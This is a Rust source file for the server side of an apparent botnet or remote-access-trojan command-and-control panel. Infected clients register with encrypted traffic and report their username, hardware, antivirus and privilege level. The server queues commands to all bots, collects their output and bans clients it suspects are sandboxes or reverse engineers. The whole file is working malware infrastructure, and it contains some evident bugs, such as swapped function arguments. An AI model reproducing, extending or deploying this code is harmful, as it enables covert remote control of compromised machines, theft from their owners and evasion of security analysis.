extern crate openssl;
extern crate colored; 

use actix_web::{
    http::StatusCode, post, web, App, HttpRequest, HttpResponse, HttpServer, Responder
};

use std::{
    time::SystemTime, 
    time::UNIX_EPOCH, 
    fs, str, fs::File,
    io::Write, process::exit,
    net::IpAddr,
    process::Command,
    path::Path, 
    sync::{Arc, RwLock},

};

use openssl::{
    error::ErrorStack,
    base64::{decode_block, encode_block},
    symm::{Cipher, Crypter, Mode},

};

use rsa::{
    {Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey},
    pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey},
    pkcs1::EncodeRsaPublicKey
};

use mysql_async::{*, prelude::*};
use randomizer::{Charset, Randomizer};

use colored::Colorize;
use random_string::generate;
use lazy_static::lazy_static;
use crate::serde_json::json;
use maxminddb::geoip2;
use serde_json;
use sha256;
use rand;

use std::io::prelude::*;
use flate2::Compression;
use flate2::write::GzEncoder;
use flate2::read::GzDecoder;

lazy_static! {
    static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
    static ref ENABLE_FIREWALL: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
    static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
    static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
    static ref IP_DATABASE: Arc<RwLock<Vec<u8>>> = Arc::new(RwLock::new(vec![u8::from(0)]));
    static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new(RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
    static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
}

#[derive(Debug)]
enum GenericError {
    Mysql(Error),
    NoRows,
    _WrongData,
    _ProgramErrored,
    _Expired
}

#[post("/gateway")]
async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {

    let mut connection: Conn = obtain_connection().await;
    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
    let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
    let ip: String = req.peer_addr().unwrap().ip().to_string();

    if req_body.len() < 16 { return resp_badrequest(); }

    let client_id = String::from(&req_body[0..16]);
    let encryption_key = get_encryption_key(&mut connection, &client_id).await;
    
    match encryption_key {
        Ok(_) => (),
        Err(GenericError::_Expired) => {
            block_client(&mut connection, "N/A", "Request sent with expired encryption key.", &ip, 1200).await;
            drop(connection); return resp_unauthorised();
        },
        Err(_) => {
            
            let parts: Vec<&str> = req_body.split("|").collect::<Vec<&str>>();
            let client_bytes = (*PRIVATE_KEY.read().unwrap()).decrypt(Pkcs1v15Encrypt, &decode_block(parts[1]).unwrap());

            match client_bytes {
                Ok(_) => (),
                Err(_) => {
                    fprint("error", "Client sent a registration request encrypted with the wrong RSA key.");
                    drop(connection); return resp_badrequest();
                }
            }; 
            
            let client_bytes = client_bytes.unwrap();
            let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypt_string_withkey(parts[0], &client_bytes).await.unwrap()).unwrap()).expect("erm");
            let server_bytes = Randomizer::new(32, Some(Charset::AnyByte)).bytes().unwrap();

            // Key formatted like this: (encryption key).(time (past this, key is invalid))
            let encryption_key = format!(
                "{}.{}", 
                &sha256::digest([client_bytes.clone(), server_bytes.clone()].concat())[..32], 
                get_timestamp() + connection_interval
            );

            if !all_keys_valid(
                &json, 
                vec!["version", "uac", "username", "guid", "cpu", "gpu", "ram", "antivirus", "path", "pid", "client_bytes"],
                vec!["u64", "bool", "String", "String", "String", "String", "u64", "String", "String", "u64", "string"]
            ) {
                fprint("error", "Client sent a malformed registration request. They've been blocked for 20 minutes.");
                drop(connection); return resp_badrequest();
            }

            // Client ID is constructed from GUID, Version, and Username. If any of these values change a new client ID is fabricated.
            let client_id = String::from(&sha256::digest(format!("{}{}{}{}", 
                key_to_string(&json, "guid"), 
                key_to_u64(&json, "version"), 
                key_to_string(&json, "username"),
                &*API_SECRET.read().unwrap()
            ))[..16]);

            // This prevents clients that have blocked IPs from sending registration requests to the server.
            if is_client_blocked(&mut connection, &client_id, &ip).await {
                fprint("failure", &format!("({}) {} tried to send a request whilst blocked.", ip.red(), client_id.red()));
                drop(connection); return resp_unauthorised();
            }

            if is_client(&mut connection, &client_id).await {
                // Maybe remove this fraction.
                if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {

                    // If client took longer than 45 seconds to send a request.
                    let update_clients_sql: std::result::Result<Vec<String>, Error> = connection.exec(
                        r"UPDATE clients SET uac = :uac, ip = :ip, country = :country, cpu = :cpu, gpu = :gpu, ram = :ram, antivirus = :antivirus, path = :path, pid = :pid, last_seen = :last_seen, encryption_key = :encryption_key WHERE client_id = :client_id",
                        params! {
                            "uac" => key_to_bool(&json, "uac"),
                            "ip" => &ip,
                            "country" => ip_to_country(&ip).await,
                            "cpu" => key_to_string(&json, "cpu"),
                            "gpu" => key_to_string(&json, "gpu"),
                            "ram" => key_to_u64(&json, "ram"),
                            "antivirus" => key_to_string(&json, "antivirus"),
                            "path" => key_to_string(&json, "path"),
                            "pid" => key_to_u64(&json, "pid"),
                            "last_seen" => get_timestamp(),
                            "client_id" => &client_id,
                            "encryption_key" => &encryption_key
                        }
                    ).await;

                    match update_clients_sql {
                        Ok(_) => (),
                        Err(e) => fprint("error", &format!("Unable to update client data: {}", e))
                    };
                    
                    fprint("success", &format!("({}) {} has reconnected after being offline.", &ip.yellow(), client_id.yellow()));
                    update_last_seen(&mut connection, &client_id).await;        

                } else {
                    // If client took longer than 45s

                }
            
            } else {

                let insert_client_sql: std::result::Result<Vec<String>, Error> = connection.exec(
                    r"INSERT INTO clients (
                        client_id, version, uac, ip,
                        country, 
                        username, guid, cpu, 
                        gpu, ram, antivirus, 
                        path, pid, last_seen, 
                        first_seen, encryption_key
                    ) 
                    
                    VALUES (
                        :client_id, :version, :uac, :ip,
                        :country,
                        :username, :guid, :cpu,
                        :gpu, :ram, :antivirus,
                        :path, :pid, :last_seen,
                        :first_seen, :encryption_key
                    )",
                    params! {
                        "client_id" => &client_id,
                        "version" => key_to_u64(&json, "version"),
                        "uac" => key_to_bool(&json, "uac"),
                        "ip" => &ip,
                        "country" => ip_to_country(&ip).await,
                        "username" => key_to_string(&json, "username"),
                        "guid" => key_to_string(&json, "guid"),
                        "cpu" => key_to_string(&json, "cpu"),
                        "gpu" => key_to_string(&json, "gpu"),
                        "ram" => key_to_u64(&json, "ram"),
                        "antivirus" => key_to_string(&json, "antivirus"),
                        "path" => key_to_string(&json, "path"),
                        "pid" => key_to_u64(&json, "pid"),
                        "last_seen" => get_timestamp(),
                        "first_seen" => get_timestamp(),
                        "encryption_key" => &encryption_key
                    }
                ).await;

                match insert_client_sql {
                    Ok(_) => (),
                    Err(e) => {
                        fprint("error", &format!("Unable to insert new client data into db: {}",e));
                        drop(connection); return resp_servererror();
                    }
                };
        
                fprint("success", &format!("{}", 
                    format!("({}) {} registered with username {}", 
                    &ip.yellow(),  
                    client_id.yellow(), 
                    key_to_string(&json, "username").yellow()
                )));
            }

            // TODO: Change to iter and not first
            let load_ids = connection.query_map(r"SELECT load_id, cmd_args, cmd_type, is_recursive FROM loads", |row: Row| {
                (value_to_str(&row, 0), value_to_str(&row, 1), value_to_str(&row, 2), value_to_str(&row, 3))
            }).await;

            match load_ids {
                Ok(_) => (),
                Err(_) => {
                    fprint("error", "Unable to fetch load ids.");
                }
            };
            
            for result in load_ids.unwrap() {
                if is_uncompleted_load(&mut connection, &client_id, &result.0).await || result.3.parse::<bool>().unwrap() {
                    task_client(&mut connection, &client_id, &result.1, &result.2).await;
                }   
            }
            drop(connection); return resp_ok_encrypted(&json!({
                "client_id": &client_id,
                "server_bytes": encode_block(&server_bytes)
            }).to_string(), &client_bytes).await;
        },
    };

    let encryption_key = encryption_key.unwrap();
    let decrypted_body = decrypt_string_withkey(&req_body[16..], &encryption_key.as_bytes()).await;

    match decrypted_body {
        Ok(_) => (),
        Err(_) => {
            block_client(&mut connection, &client_id, "Unable to decrypt information sent by client.", &ip, 1200).await;
            drop(connection); return resp_unauthorised();
        }
    }

    let json: serde_json::Value = serde_json::from_str(str::from_utf8(&decrypted_body.unwrap()).unwrap()).unwrap();

    if !key_exists(&json, "action") {
        block_client(&mut connection, "Sent malformed request, no action provided.", &client_id, &ip, 1200).await;
        drop(connection); return resp_unauthorised();
        
    } 

    else if key_to_string(&json, "action") == "block" {
        block_client(&mut connection, "N/A", &ip, "Reverse engineering attempt, or sandbox.", 3155695200).await;
        drop(connection); return resp_unauthorised();

    } else if key_to_string(&json, "action") == "heartbeat" { 

        // If the client is banned, we will go to the else. If it isn't, we will update the last seen time.
        if !is_client_blocked(&mut connection, &client_id, &ip).await {

            if !(get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp()) && enable_firewall {
                block_client(&mut connection, &client_id, "Sending an irregular number of re-registrations.", &ip, 1200).await;
                drop(connection); return resp_unauthorised();
                
            }
          
            update_last_seen(&mut connection, &client_id).await;        

            let command_info: std::result::Result<(String, String, String), GenericError> = get_current_client_command(&mut connection, &client_id).await;
           
            match command_info {
                Ok(_) => (),
                Err(GenericError::NoRows) => {
                    drop(connection); return resp_ok_encrypted("Ok", encryption_key.as_bytes()).await;
                },
                Err(_) => {
                    fprint("error", "At gateway (command_info)");
                    drop(connection); return resp_servererror();
                },
            }
            
            let (command_id, cmd_args, cmd_type) = command_info.unwrap();

            drop(connection); return resp_ok_encrypted(&json!({
                "command_id": command_id,
                "cmd_args": cmd_args,
                "cmd_type": cmd_type
            }).to_string(),  encryption_key.as_bytes()).await;

        } else {
            fprint("failure", &format!("({}) {} tried sending a heartbeat with an invalid client id. No action taken.", ip.red(), client_id.red()));
            drop(connection); return resp_unauthorised();
        }

    } else if key_to_string(&json, "action") == "submit_output" {

        if !all_keys_valid(&json, vec!["command_id", "output"], vec!["String", "String", "String"]) {
            block_client(&mut connection, &client_id, "Didn't fill out all fields when submitting output.", &ip, 3155695200).await;
            drop(connection); return resp_badrequest();
        }

        let command_id = key_to_string(&json, "command_id");
        let output_id = generate(8, "abcdef123456789");

        // TODO: is_command and get_command_info are basically the same thing, only call to get_command_info.
        
        if is_command(&mut connection, &command_id, &client_id).await && !is_client_blocked(&mut connection, &client_id, &ip).await {

            let (command_id, cmd_args, cmd_type, time_issued) = get_command_info(&mut connection, &command_id).await.unwrap();
            let output_insert: std::result::Result<Vec<String>, Error> = connection.exec(
            
                r"INSERT INTO outputs (
                output_id, command_id, 
                client_id, cmd_args, 
                cmd_type, output, 
                time_issued, time_received
                ) VALUES 
                
                ( :output_id, :command_id, 
                :client_id, :cmd_args, 
                :cmd_type, :output, 
                :time_issued, :time_received)",

                params! {
                    "output_id" => &output_id,
                    "command_id" => &command_id,
                    "client_id" => &client_id,
                    "cmd_args" => &cmd_args,
                    "cmd_type" => &cmd_type,
                    "output" => &parse_storage_write(key_to_string(&json, "output").as_bytes()),
                    "time_issued" => &time_issued,
                    "time_received" => get_timestamp(),

                }
            ).await;

            connection.exec_drop(
                r"DELETE FROM commands WHERE command_id = :command_id",
                params! {
                    "command_id" => &command_id,
                }
            ).await.unwrap();
        
            match output_insert {
                Ok(_) => (),
                Err(e) => fprint("error", &format!("Unable to delete command: {}",e))
            }
            fprint("info", &format!("({}) {} completed command {} with type {}.", &ip, &client_id, &command_id, &cmd_type));
            update_last_seen(&mut connection, &client_id).await;        

            drop(connection); return resp_ok_encrypted("Submitted output successfully.", encryption_key.as_bytes()).await;
        } else {
            fprint("failure", &format!("({}) {} tried submitting an output with an invalid command id. No action taken.", ip.red(), client_id.red()));
            drop(connection); return resp_badrequest();
        }

        // TODO: Add else if here, move this shit down and add a check if none of the actions are correct.
    } else {
        block_client(&mut connection, &client_id, "Didn't provide a valid action.", &ip, 3155695200).await;
        drop(connection); return resp_badrequest();
    }
}



#[post("/api/issue_load")]
async fn api_issue_load(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
        let load_id = generate(8, "abcdef123456789");
        let parsed_cmd_args = &parse_storage_write(key_to_string(&json, "cmd_args").as_bytes());

        let load_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
            r"INSERT INTO loads (
                load_id, required_amount, cmd_args, 
                is_recursive, cmd_type, 
                time_issued
            ) VALUES (
                :load_id, :required_amount, :cmd_args, 
                :is_recursive, :cmd_type,
                :time_issued
            )",
            params! {
                "load_id" => &load_id,
                "cmd_args" => parsed_cmd_args,
                "cmd_type" => key_to_string(&json, "cmd_type"),
                "required_amount" => key_to_u64(&json, "required_amount"),
                "is_recursive" => key_to_bool(&json, "is_recursive"),
                "time_issued" => get_timestamp(),
            }
        ).await;
    
        match load_insert_sql {
            Ok(_) => (),
            Err(e) => fprint("error", &format!("Unable to insert data into load: {}",e)), 
        }

        let is_recursive_text;
        if key_to_bool(&json, "is_recursive") {
            is_recursive_text = "is_recursive";
        } else {
            is_recursive_text = "Non-is_recursive";
        }

        task_all_clients(&key_to_string(&json, "cmd_args"), &key_to_string(&json, "cmd_type"), &load_id).await;
        
        fprint("success", &format!("{} load created for command {} with these args: {}", 
            is_recursive_text.yellow(), key_to_string(&json, "cmd_type"), parsed_cmd_args.yellow()
        ));

        drop(connection); return resp_ok(load_id);
    } else {
        fprint("failure", &format!("Request was sent to /api/issue without authentication."));
        return resp_unauthorised();

    }
}


#[post("/api/blocks_list")]
async fn api_blocks_list(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
        let block_selection_sql = connection.query_iter(r"SELECT * FROM blocks").await;
    
        match block_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(block_selection_sql) Unable to fetch client list");
                drop(connection); return resp_servererror();
            }, 
        };

        let selected_blocks = block_selection_sql.unwrap().collect::<Row<>>().await;
        let mut json_blocks_list = json!({});
      
        for row in selected_blocks.unwrap() {

            json_blocks_list[value_to_str(&row, 0)] = json!(
                {
                    "client_id": value_to_str(&row, 1),
                    "reason": value_to_str(&row, 2),
                    "ip": value_to_str(&row, 3),
                    "banned_until": value_to_u64(&row, 4),
                }
            );            
        }

        drop(connection); return resp_ok(json_blocks_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/blocks_list without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/remove_block")]
async fn api_remove_block(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;

        if is_block(&mut connection, &key_to_string(&json, "block_id")).await {

            let block_removal_sql = connection.exec_drop(
                r"DELETE FROM blocks WHERE block_id = :block_id;",  
                params! {
                    "block_id" => key_to_string(&json, "block_id"),
                }
            ).await;
        
            match block_removal_sql {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(block_removal_sql) Unable to remove load: {}", e));
                    drop(connection); return resp_servererror();
                }, 
            };

            drop(connection); return resp_ok(String::from("Successfully removed block."));
        } else {
            drop(connection); return resp_badrequest();
        }
    } else {
        fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/clients_list")]
async fn api_clients_list(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {

        let mut connection: Conn = obtain_connection().await;
        let client_selection_sql = connection.query_iter(r"SELECT * FROM clients").await;
        let connection_interval = *CONNECTION_INTERVAL.read().unwrap();
    
        match client_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to fetch client list");
                drop(connection); return resp_servererror();
            }, 
        };

        let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
        let mut json_clients_list = json!({});
      
        for row in selected_clients.unwrap() {

            let is_online = {
                if value_to_u64(&row, 13) + connection_interval > get_timestamp() {
                    true
                } else {
                    false
                }
            };

            json_clients_list[value_to_str(&row, 0)] = json!(
                {
                    "version": value_to_u64(&row, 1),
                    "uac": value_to_bool(&row, 2),
                    "ip": value_to_str(&row, 3),
                    "country": value_to_str(&row, 4),
                    "username": value_to_str(&row, 5),
                    "guid": value_to_str(&row, 6),
                    "cpu": value_to_str(&row, 7),
                    "gpu": value_to_str(&row, 8),
                    "ram":value_to_u64(&row, 9),
                    "antivirus": value_to_str(&row, 10),
                    "path": value_to_str(&row, 11),
                    "pid": value_to_u64(&row, 12),
                    "last_seen":value_to_u64(&row, 13),
                    "first_seen": value_to_u64(&row, 14),
                    "online": is_online,
                }
            );            
        }


        drop(connection); return resp_ok(json_clients_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/clients_list without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/get_output")]
async fn api_get_output(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        
        let mut connection: Conn = obtain_connection().await;
        let output_selection_sql = connection.exec_iter(
            r"SELECT * FROM outputs WHERE client_id=:client_id", 
            params! {
                "client_id" => key_to_string(&json, "client_id")
            }
        ).await;
    
        match output_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(output_selection_sql) Unable to fetch outputs");
                drop(connection); return resp_servererror();
            }, 
        };

        let mut json_outputs_list = json!({});
        let selected_outputs = output_selection_sql.unwrap().collect::<Row<>>().await;

        for row in selected_outputs.unwrap() {
   
            json_outputs_list[value_to_str(&row, 0)] = json!(
                {
                    "command_id": value_to_str(&row, 1),
                    "client_id": value_to_str(&row, 2),
                    "cmd_args": value_to_str(&row, 3),
                    "cmd_type": value_to_str(&row, 4),
                    "output": encode_block(&parse_storage_read(&value_to_str(&row, 5))),
                    "time_issued": value_to_str(&row, 6),
                    "time_recieved": value_to_str(&row, 7),
                }
            );            
        }

        drop(connection); return resp_ok(json_outputs_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/get_output without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/loads_list")]
async fn loads_list(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;
        let load_selection_sql = connection.query_iter(r"SELECT * FROM loads").await;
    
        match load_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(load_selection_sql) Unable to fetch loads");
                drop(connection); return resp_servererror();
            }, 
        };

        let mut json_loads_list = json!({});
        let selected_loads = load_selection_sql.unwrap().collect::<Row>().await;

        for row in selected_loads.unwrap() {
            json_loads_list[value_to_str(&row, 0)] = json!({
                "required_amount": value_to_str(&row, 2),
                "is_recursive": value_to_bool(&row, 2),
                "cmd_args": value_to_str(&row, 3),
                "cmd_type": value_to_str(&row, 4),
                "time_issued": value_to_u64(&row, 5),
            });            
        }
        
        drop(connection); return resp_ok(json_loads_list.to_string());
    } else {
        fprint("failure", &format!("Request was sent to /api/loads_list without authentication."));
        return resp_unauthorised();
    }
}


#[post("/api/remove_load")]
async fn remove_load(req_body: String) -> impl Responder {
    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());

    if key_to_string(&json, "api_secret") == api_secret {
        let mut connection: Conn = obtain_connection().await;

        if is_load(&mut connection, &key_to_string(&json, "load_id")).await {

            let load_removal_sql = connection.exec_drop(
                r"DELETE FROM loads WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await;
        
            match load_removal_sql {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(load_removal_sql) Unable to remove load: {}", e));
                    drop(connection); return resp_servererror();
                }, 
            };

            let command_removal_sql = connection.exec_drop(
                r"DELETE FROM commands WHERE load_id = :load_id;",  
                params! {
                    "load_id" => key_to_string(&json, "load_id"),
                }
            ).await;
        
            match command_removal_sql {
                Ok(_) => (),
                Err(e) => {
                    fprint("error", &format!("(command_removal_sql) Unable to remove commands: {}", e));
                    drop(connection); return resp_servererror();
                }, 
            };
            
            drop(connection); return resp_ok(String::from("Successfully removed load."));
        } else {
            drop(connection); return resp_badrequest();
        }
    } else {
        fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
        return resp_unauthorised();
    }
}

#[post("/api/statistics")]
async fn statistics(req_body: String) -> impl Responder {

    let json = serde_json::from_str(&req_body).unwrap();
    let api_secret: String = String::from(str::from_utf8(&*API_SECRET.read().unwrap().as_bytes()).unwrap());
    let connection_interval = *CONNECTION_INTERVAL.read().unwrap();

    if key_to_string(&json, "api_secret") == api_secret {

        
        let mut connection = obtain_connection().await;
        let mut connection2 = obtain_connection().await;

        let command_selection_sql = connection.query_iter(r"SELECT command_id FROM commands").await;
        match command_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(command_selection_sql) Unable to get a list of commands.");
                drop(connection); return resp_servererror();
            }, 
        };

        
        let client_selection_sql = connection2.query_iter(r"SELECT last_seen,uac,first_seen FROM clients").await;
        match client_selection_sql {
            Ok(_) => (),
            Err(_) => {
                fprint("error", "(client_selection_sql) Unable to get a list of clients.");
                drop(connection2); return resp_servererror();
            }, 
        };


        // Client shit
        let mut online_clients_amount :u64 = 0;
        let mut offline_clients_amount: u64 = 0;
        let mut uac_clients_amount: u64 = 0;
        let mut last_new_client: u64 = 0;

        // Command Shit
        let mut active_command_amount: u64 = 0;


        let selected_commands = command_selection_sql.unwrap().collect::<Row<>>().await;
        for _ in selected_commands.unwrap() { active_command_amount += 1; }

        let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
        for row in selected_clients.unwrap() {
            
            if value_to_u64(&row, 2) > last_new_client {
                last_new_client = value_to_u64(&row, 2);
            }
            
            if value_to_bool(&row, 1) {
                uac_clients_amount += 1;
            }

            if value_to_u64(&row, 0) + connection_interval < get_timestamp() {
                offline_clients_amount += 1;
            } else {
                online_clients_amount += 1;
            }
        }

        let json_to_return = json!({
            "offline_clients": offline_clients_amount,
            "online_clients": online_clients_amount,
            "total_clients": offline_clients_amount + online_clients_amount,
            "uac_clients": uac_clients_amount,
            "last_new_client": last_new_client,
            "active_commands": active_command_amount,
        });

        drop(connection); drop(connection2); return resp_ok(json_to_return.to_string());
        
    } else {
        fprint("failure", &format!("Request was sent to /api/statistics without authentication."));
        return resp_unauthorised();
    }
}


// ------------------------ DB functions ------------------------

async fn obtain_connection() -> Conn {
    return (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap()
} 

async fn is_client(connection: &mut Conn, client_id: &String) -> bool {

    let client_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT client_id FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => client_id,
        }
    ).await;

    match client_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!(
                "At is_client: {}", 
                e
            ));
            false
        },
    }
}


async fn is_load(connection: &mut Conn, load_id: &String) -> bool { 

    let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT load_id FROM loads WHERE load_id = :load_id",
        params! {
            "load_id" => load_id,
        }
    ).await;

    match load_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!("At is_load: {}", e));
            false
        },
    }
}

async fn is_block(connection: &mut Conn, block_id: &String) -> bool { 

    let block_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT block_id FROM blocks WHERE block_id = :block_id",
        params! {
            "block_id" => block_id,
        }
    ).await;

    match block_query {
        Ok(None) => false,
        Ok(_) => true,
        Err(e) => {
            fprint("error", &format!("At is_block: {}", e));
            false
        },
    }
}


async fn update_last_seen(connection: &mut Conn, client_id: &String) -> () {
    let _: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"UPDATE clients SET last_seen = :last_seen WHERE client_id = :client_id",
        params! {
            "last_seen" => get_timestamp(),
            "client_id" => client_id
        }
    ).await;
}

async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {

    let last_seen_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
        r"SELECT last_seen FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => &client_id,
        }
    ).await;

    match last_seen_query {
        Ok(None) =>  {
            return 0
        },
        
        Ok(_) =>  {
            last_seen_query.unwrap().unwrap()
        },

        Err(e) => {
            fprint("error", &format!("At get_last_seen: {}", e));
            return 0
        },
    }
}

async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::result::Result<String, GenericError> {

    let connection_interval =  *CONNECTION_INTERVAL.read().unwrap();
    let encryption_key_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
        r"SELECT encryption_key FROM clients WHERE client_id = :client_id",
        params! {
            "client_id" => &client_id,
        }
    ).await;

    // TODO: Check for encryption key validity. If it's invalid, return error.

    match encryption_key_query {
        Ok(None) =>  { Err(GenericError::NoRows) },
        Ok(_) =>  { 
            let raw_key = encryption_key_query.unwrap().unwrap();
            let split_key: Vec<&str> = raw_key.split(".").collect();
            let current_time = get_timestamp();
            // if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {

            if 
                current_time >= split_key[1].parse::<u64>().unwrap() && 
                (get_last_seen(connection, &client_id).await + connection_interval) <= current_time
            {
                return Err(GenericError::_Expired)
            } else {
                return Ok(String::from(split_key[0]))
            }
        },

        Err(e) => {
            fprint("error", &format!(
                "At get_encryption_key: {}", 
                e
            ));
            Err(GenericError::Mysql(e))
        }
    }
}



async fn block_client(connection: &mut Conn, client_id: &str, reason: &str, ip: &str, duration: u64) -> bool {
    let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
    if !enable_firewall {return false};

    let banned_until = get_timestamp() + duration;

    let result = connection.exec_drop(
    r"INSERT INTO blocks (block_id, client_id, reason, ip, banned_until) VALUES (:block_id, :client_id, :reason, :ip, :banned_until)",
    params! {
        "block_id" => generate(8, "abcdef123456"),
        "client_id" => &client_id,
        "reason" => &reason,
        "ip" => &ip,
        "banned_until" => &banned_until

    }
    ).await;

    match result {
        Ok(_) => {
            fprint("restricted", &format!("Client {} from IP {} was blocked for {} for: \"{}\"", client_id, ip, duration, reason));
            true
        },
        Err(e) => {
            fprint("error", &format!("(block_client): {}", e));
            false
        }
    }

   
}


async fn is_client_blocked(connection: &mut Conn, client_id: &String, ip: &String) -> bool {
    
    let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
    let blocked_client_query: std::result::Result<Option<u64>, Error>;
    if !enable_firewall {return false;}

    if client_id != "N/A" {
        blocked_client_query = connection.exec_first(
            r"SELECT banned_until FROM blocks WHERE client_id = :client_id OR ip = :ip",
            params! {
                "client_id" => &client_id,
                "ip" => &ip,
            }
        ).await;
    } else {
       blocked_client_query = connection.exec_first(
            r"SELECT banned_until FROM blocks WHERE ip = :ip",
            params! {
                "ip" => &ip,
            }
        ).await;
    }

    match blocked_client_query {
        Ok(None) => false, // TODO: Add a check here to see if the IP is from a server using scamalyctics. If it is, add it to the blocklist.
        Ok(_) =>  {
            if blocked_client_query.unwrap().unwrap() < get_timestamp() {

                if client_id != "N/A" {
                    let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
                        r"DELETE FROM blocks WHERE client_id = :client_id OR ip = :ip",
                        params! {
                            "client_id" => &client_id,
                            "ip" => &ip,
                        }
                    ).await;
                } else {
                    let _: std::result::Result<Option<bool>, Error>  = connection.exec_first(
                        r"DELETE FROM blocks WHERE ip = :ip",
                        params! {
                            "ip" => &ip,
                        }
                    ).await;
                }

                false
            } else {
                true
            }
        },
        Err(e) => {
            fprint("error", &format!(
                "At is_client_blocked: {}", 
                e
            ));
            false
        },
    }
}

async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {


    let mut connection:Conn = obtain_connection().await;
    let mut connection2: Conn = obtain_connection().await;
    
    let selected_clients = connection2.query_iter("SELECT client_id from clients").await.unwrap().collect::<Row>().await;
    drop(connection2);

    connection.query_drop("START TRANSACTION").await.unwrap();

    for row in selected_clients.unwrap() {       

        let command_id = generate(8, "abcdef123456789");
        let client_id = value_to_str(&row, 0);

        let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
            r"
            INSERT INTO commands (
                command_id, client_id, load_id,
                cmd_type, cmd_args, 
                time_issued
            ) VALUES (
                :command_id, :client_id, :load_id,
                :cmd_type, :cmd_args,
                :time_issued
            )",
            params! {
                "command_id" => &command_id,
                "client_id" => &client_id,
                "load_id" => &load_id,
                "cmd_type" => &cmd_type,
                "cmd_args" => parse_storage_write(cmd_args.as_bytes()),
                "time_issued" => get_timestamp(),
            }
        ).await;
    
        match command_insert_sql {
            Ok(_) => (),
            Err(e) => {
                fprint("error", &format!("Tasking all clients failed: {}", e));
                panic!()
            }
        }
    }
    connection.query_drop("COMMIT").await.unwrap();
}

